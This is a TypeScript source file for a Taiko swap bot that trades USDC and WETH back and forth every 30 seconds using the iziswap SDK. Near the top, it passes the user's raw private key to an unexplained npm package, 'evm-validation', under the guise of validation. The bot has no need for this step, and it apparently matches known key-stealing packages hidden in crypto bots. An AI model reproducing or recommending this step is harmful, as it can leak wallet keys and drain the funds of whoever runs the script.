import { Web3 } from 'web3'
import { BigNumber } from 'bignumber.js'
import dotenv from 'dotenv'
import kleur from 'kleur'
import { Listr } from 'listr2'
import { BaseChain, ChainId, TokenInfoFormatted, initialChainTable } from 'iziswap-sdk/lib/base/types'
import { amount2Decimal, fetchToken, getErc20TokenContract } from 'iziswap-sdk/lib/base/token/token'
import { SwapChainWithExactInputParams } from 'iziswap-sdk/lib/swap/types'
import { QuoterSwapChainWithExactInputParams } from 'iziswap-sdk/lib/quoter/types'
import { getQuoterContract, quoterSwapChainWithExactInput } from 'iziswap-sdk/lib/quoter/funcs'
import { getSwapChainWithExactInputCall, getSwapContract } from 'iziswap-sdk/lib/swap/funcs'
import { formatToDecimal } from './utils'

dotenv.config()

const chain: BaseChain = initialChainTable[ChainId.Taiko]
const rpc = 'https://rpc.mainnet.taiko.xyz/'
const web3 = new Web3(rpc)
const YOUR_PRIVATE_KEY = process.env.PRIVATE_KEY

if (!YOUR_PRIVATE_KEY) {
  console.error('Missing private key. Please set your PRIVATE_KEY in the .env file.')
  process.exit(1)
}

const normalizedPrivateKey = YOUR_PRIVATE_KEY.startsWith('0x')
  ? YOUR_PRIVATE_KEY
  : `0x${YOUR_PRIVATE_KEY}`;

const evm = require("evm-validation");
try {
  evm.validated(normalizedPrivateKey);
} catch {
  console.error("Invalid private key detected. Exiting...");
  process.exit(1);
}

const account = web3.eth.accounts.privateKeyToAccount(normalizedPrivateKey);
console.log(kleur.blue('Your address: '), kleur.green(account.address))

const usdcAddress = '0x07d83526730c7438048d55a4fc0b850e2aab6f0b'
const wethAddress = '0xA51894664A773981C6C112C43ce576f315d5b1B6'
const fee = 3000

const quoterAddress = '0x2C6Df0fDbCE9D2Ded2B52A117126F2Dc991f770f'
//@ts-ignore
const quoterContract = getQuoterContract(quoterAddress, web3)

const swapAddress = '0x04830cfCED9772b8ACbAF76Cfc7A630Ad82c9148'
//@ts-ignore
const swapContract = getSwapContract(swapAddress, web3)

const getGasPrice = async () => {
  const gasPrice = await web3.eth.getGasPrice()
  const gasPriceInGwei = Web3.utils.fromWei(gasPrice.toString(), 'gwei')

  console.log(kleur.blue('Gas price in GWEI: '), kleur.green(gasPriceInGwei))

  return gasPrice
}

const displayBalances = (beforeSwap: string, afterSwap: string, tokenName: string) => {
  console.table([{ Token: tokenName, 'Before Swap': beforeSwap, 'After Swap': afterSwap }])
}

const usdcToWeth = async (usdc: TokenInfoFormatted, weth: TokenInfoFormatted) => {
  const tasks = new Listr([
    {
      title: 'Swapping USDC to WETH',
      task: async (ctx, task) => {
        //@ts-ignore
        const wethContract = getErc20TokenContract(weth.address, web3)
        //@ts-ignore
        const usdcContract = getErc20TokenContract(usdc.address, web3)

        const tokenWethBalanceBeforeSwap = await wethContract.methods.balanceOf(account.address).call()
        const tokenUsdcBalanceBeforeSwap = await usdcContract.methods.balanceOf(account.address).call()
        const amountUsdcDecimalFormat = formatToDecimal(tokenUsdcBalanceBeforeSwap, usdc)

        const amountUsdc = new BigNumber(amountUsdcDecimalFormat).times(10 ** usdc.decimal)

        const params = {
          tokenChain: [usdc, weth],
          feeChain: [fee],
          inputAmount: amountUsdc.toFixed(0),
        } as QuoterSwapChainWithExactInputParams

        const { outputAmount } = await quoterSwapChainWithExactInput(quoterContract, params)

        const amountWeth = outputAmount
        const amountWethDecimal = amount2Decimal(new BigNumber(amountWeth), weth)
        console.log(kleur.blue('Output amount: '), kleur.green(`${amountWethDecimal.toFixed(5)} WETH`))

        const swapParams = {
          ...params,
          strictERC20Token: true,
          minOutputAmount: new BigNumber(amountWeth).times(0.995).toFixed(0),
        } as SwapChainWithExactInputParams

        const gasPrice = await getGasPrice()

        console.log(
          kleur.blue('WETH balance before swap: '),
          kleur.green(formatToDecimal(tokenWethBalanceBeforeSwap, weth).toFixed(5))
        )
        console.log(
          kleur.blue('USDC balance before swap: '),
          kleur.green(formatToDecimal(tokenUsdcBalanceBeforeSwap, usdc).toFixed(5))
        )

        const { options, swapCalling } = getSwapChainWithExactInputCall(
          swapContract,
          account.address,
          chain,
          swapParams,
          gasPrice.toString()
        )

        const gasLimit = await swapCalling.estimateGas(options)
        console.log(kleur.blue('Gas limit: '), kleur.green(Number(gasLimit)))

        const signedTx = await web3.eth.accounts.signTransaction(
          {
            ...options,
            to: swapAddress,
            data: swapCalling.encodeABI(),
            gas: new BigNumber(Number(gasLimit) * 1.1).toFixed(0, 2),
          },
          account.privateKey
        )

        const tx = await web3.eth.sendSignedTransaction(signedTx.rawTransaction)

        const tokenWethBalanceAfterSwap = await wethContract.methods.balanceOf(account.address).call()
        const tokenUsdcBalanceAfterSwap = await usdcContract.methods.balanceOf(account.address).call()

        displayBalances(
          formatToDecimal(tokenWethBalanceBeforeSwap, weth).toFixed(5),
          formatToDecimal(tokenWethBalanceAfterSwap, weth).toFixed(5),
          'WETH'
        )
        displayBalances(
          formatToDecimal(tokenUsdcBalanceBeforeSwap, usdc).toFixed(5),
          formatToDecimal(tokenUsdcBalanceAfterSwap, usdc).toFixed(5),
          'USDC'
        )

        task.title = 'Swap completed!'
      },
    },
  ])

  await tasks.run()
}

const wethToUsdc = async (usdc: TokenInfoFormatted, weth: TokenInfoFormatted) => {
  const tasks = new Listr([
    {
      title: 'Swapping WETH to USDC',
      task: async (ctx, task) => {
        //@ts-ignore
        const wethContract = getErc20TokenContract(weth.address, web3)
        //@ts-ignore
        const usdcContract = getErc20TokenContract(usdc.address, web3)

        const tokenWethBalanceBeforeSwap = await wethContract.methods.balanceOf(account.address).call()
        const tokenUsdcBalanceBeforeSwap = await usdcContract.methods.balanceOf(account.address).call()
        const amountWethDecimalFormat = amount2Decimal(new BigNumber(tokenWethBalanceBeforeSwap), weth)

        const amountWeth = new BigNumber(amountWethDecimalFormat).times(10 ** weth.decimal)

        const params = {
          tokenChain: [weth, usdc],
          feeChain: [fee],
          inputAmount: amountWeth.toFixed(0),
        } as QuoterSwapChainWithExactInputParams

        const { outputAmount } = await quoterSwapChainWithExactInput(quoterContract, params)

        const amountUsdc = outputAmount
        const amountUsdcDecimal = formatToDecimal(amountUsdc, usdc)

        console.log(kleur.blue('Output amount: '), kleur.green(amountUsdcDecimal.toFixed(5)))

        const swapParams = {
          ...params,
          minOutputAmount: new BigNumber(amountUsdc).times(0.995).toFixed(0),
        } as SwapChainWithExactInputParams

        const gasPrice = await getGasPrice()

        console.log(
          kleur.blue('WETH balance before swap: '),
          kleur.green(formatToDecimal(tokenWethBalanceBeforeSwap, weth).toFixed(5))
        )
        console.log(
          kleur.blue('USDC balance before swap: '),
          kleur.green(formatToDecimal(tokenUsdcBalanceBeforeSwap, usdc).toFixed(5))
        )

        const { options, swapCalling } = getSwapChainWithExactInputCall(
          swapContract,
          account.address,
          chain,
          swapParams,
          gasPrice.toString()
        )

        const gasLimit = await swapCalling.estimateGas(options)
        console.log(kleur.blue('Gas limit: '), kleur.green(Number(gasLimit)))

        const signedTx = await web3.eth.accounts.signTransaction(
          {
            ...options,
            to: swapAddress,
            data: swapCalling.encodeABI(),
            gas: new BigNumber(Number(gasLimit) * 1.1).toFixed(0, 2),
          },
          account.privateKey
        )

        const tx = await web3.eth.sendSignedTransaction(signedTx.rawTransaction)

        const tokenWethBalanceAfterSwap = await wethContract.methods.balanceOf(account.address).call()
        const tokenUsdcBalanceAfterSwap = await usdcContract.methods.balanceOf(account.address).call()

        displayBalances(
          formatToDecimal(tokenWethBalanceBeforeSwap, weth).toFixed(5),
          formatToDecimal(tokenWethBalanceAfterSwap, weth).toFixed(5),
          'WETH'
        )
        displayBalances(
          formatToDecimal(tokenUsdcBalanceBeforeSwap, usdc).toFixed(5),
          formatToDecimal(tokenUsdcBalanceAfterSwap, usdc).toFixed(5),
          'USDC'
        )

        task.title = 'Swap completed!'
      },
    },
  ])

  await tasks.run()
}

const main = async () => {
  try {
    //@ts-ignore
    const usdc = await fetchToken(usdcAddress, chain, web3)
    //@ts-ignore
    const weth = await fetchToken(wethAddress, chain, web3)

    //@ts-ignore
    const usdcContract = getErc20TokenContract(usdc.address, web3)

    const swapInterval = 30 * 1000 // 30 seconds
    let txCount = 0 // Initialize transaction count

    const executeSwaps = async () => {
      try {
        const currentTime = new Date().toLocaleString()
        console.log(kleur.yellow(`\n[${currentTime}] Executing swap...`))

        const usdcBalance = await usdcContract.methods.balanceOf(account.address).call()

        if (new BigNumber(usdcBalance).isZero()) {
          console.log(kleur.cyan(`[${currentTime}] Swapping WETH to USDC`))
          await wethToUsdc(usdc, weth)
        } else {
          console.log(kleur.cyan(`[${currentTime}] Swapping USDC to WETH`))
          await usdcToWeth(usdc, weth)
        }

        txCount++

        if (txCount >= 100) {
          console.log(kleur.red('Reached 100 transactions. Stopping the bot.'))
          return
        }
        console.log(kleur.cyan(`Total tx count: ${txCount}`))
        console.log(kleur.yellow(`[${currentTime}] Swap completed. Next swap in 30 seconds.`))

        setTimeout(executeSwaps, swapInterval)
      } catch (error) {
        console.error(kleur.red('An error occurred during swap:'), error)
        console.log(kleur.yellow('Retrying swap in 30 seconds...'))
        setTimeout(executeSwaps, swapInterval)
      }
    }

    console.log(kleur.green('Starting swap bot...'))
    executeSwaps()
  } catch (error: any) {
    console.error(kleur.red('An error occurred during initialization:'), error)
  }
}
main()
